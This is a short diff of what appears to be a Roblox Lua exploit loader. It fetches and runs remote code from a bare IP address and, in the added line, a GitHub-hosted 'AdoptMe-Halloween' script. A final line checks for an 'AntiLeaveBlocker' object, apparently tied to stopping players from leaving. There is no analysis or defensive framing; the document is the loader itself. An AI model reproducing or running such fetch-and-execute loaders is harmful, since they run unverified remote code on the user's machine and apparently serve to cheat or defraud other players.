@@ -1,6 +1,6 @@
 ID="7e7434ea-2db4-4205-a1a7-aea137d29e91";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PabloOP-87/Cogito/refs/heads/main/AdoptMe-Halloween'))()
 
 pcall(function()
 	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
